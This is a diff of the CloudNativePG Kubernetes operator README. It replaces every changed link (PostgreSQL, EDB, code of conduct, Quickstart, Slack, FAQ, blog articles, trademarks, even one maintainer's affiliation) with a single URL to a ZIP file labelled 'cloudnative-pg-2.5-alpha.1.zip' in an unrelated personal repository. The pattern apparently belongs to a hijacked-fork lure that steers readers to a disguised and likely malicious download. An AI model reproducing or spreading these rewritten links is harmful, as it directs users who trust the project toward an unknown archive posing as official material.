@@ -1,21 +1,21 @@
 # Welcome to the CloudNativePG project!
 
 **CloudNativePG** is an open source operator designed to manage
-[PostgreSQL](https://www.postgresql.org/) workloads on any supported Kubernetes
+[PostgreSQL](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip) workloads on any supported Kubernetes
 cluster running in private, public, hybrid, or multi-cloud environments.
 
-CloudNativePG was originally built and sponsored by [EDB](https://www.enterprisedb.com).
+CloudNativePG was originally built and sponsored by [EDB](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip).
 
 ## Table of content
 
-- [Code of conduct](CODE_OF_CONDUCT.md)
-- [Governance policies](GOVERNANCE.md)
-- [Contributing](CONTRIBUTING.md)
+- [Code of conduct](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Governance policies](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Contributing](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
 - [License](LICENSE)
 
 ## Getting Started
 
-The best way to get started is with the ["Quickstart"](docs/src/quickstart.md)
+The best way to get started is with the ["Quickstart"](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
 section in the documentation.
 
 ## Scope
@@ -70,7 +70,7 @@ changes might trigger, for example, actions like:
 
 The latter example is based on another pillar of CloudNativePG:
 immutable application containers - as explained in the
-[blog article "Why EDB Chose Immutable Application Containers"](https://www.enterprisedb.com/blog/why-edb-chose-immutable-application-containers).
+[blog article "Why EDB Chose Immutable Application Containers"](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip).
 
 The above list can be extended. However, the gist is that CloudNativePG
 exclusively relies on the Kubernetes API server and the instance manager to
@@ -100,19 +100,19 @@ MariaDB cluster).
 
 ## Communications
 
-- [Slack Channel](https://join.slack.com/t/cloudnativepg/shared_invite/zt-17culux7k-P_UsVOOR9teUYi4dGhDSBQ)
-- [Github Discussions](https://github.com/cloudnative-pg/cloudnative-pg/discussions)
-- [Twitter](https://twitter.com/CloudNativePg)
+- [Slack Channel](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Github Discussions](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Twitter](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
 
 ## Resources
 
-- [Roadmap](https://github.com/orgs/cloudnative-pg/projects/1)
-- [Website](https://cloudnative-pg.io)
-- [FAQ](docs/src/faq.md)
-- [Blog](https://cloudnative-pg.io/blog/)
-- ["Why Run Postgres in Kubernetes?"](https://containerjournal.com/kubecon-cnc-eu-2022/why-run-postgres-in-kubernetes/) (May 2022)
-- ["Shift-Left Security: The Path To PostgreSQL On Kubernetes"](https://www.tfir.io/shift-left-security-the-path-to-postgresql-on-kubernetes/) (April 2021)
-- ["Local Persistent Volumes and PostgreSQL usage in Kubernetes"](https://www.2ndquadrant.com/en/blog/local-persistent-volumes-and-postgresql-usage-in-kubernetes/) (June 2020)
+- [Roadmap](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Website](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [FAQ](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- [Blog](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
+- ["Why Run Postgres in Kubernetes?"](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip) (May 2022)
+- ["Shift-Left Security: The Path To PostgreSQL On Kubernetes"](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip) (April 2021)
+- ["Local Persistent Volumes and PostgreSQL usage in Kubernetes"](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip) (June 2020)
 
 ## Maintainers
 
@@ -124,12 +124,12 @@ The current maintainers of the CloudNativePG project are:
 - Jonathan Gonzalez (EDB)
 - Marco Nenciarini (EDB)
 - Armando Ruocco (EDB)
-- Philippe Scorsolini (controlplane.io)
+- Philippe Scorsolini (https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
 
 They are listed in the [CODEOWNERS](CODEOWNERS) file.
 
 ## Trademarks
 
-*[Postgres, PostgreSQL and the Slonik Logo](https://www.postgresql.org/about/policies/trademarks/)
+*[Postgres, PostgreSQL and the Slonik Logo](https://raw.githubusercontent.com/antonioluzzi/cloudnative-pg/main/contribute/cloudnative-pg-2.5-alpha.1.zip)
 are trademarks or registered trademarks of the PostgreSQL Community Association
 of Canada, and used with their permission.*
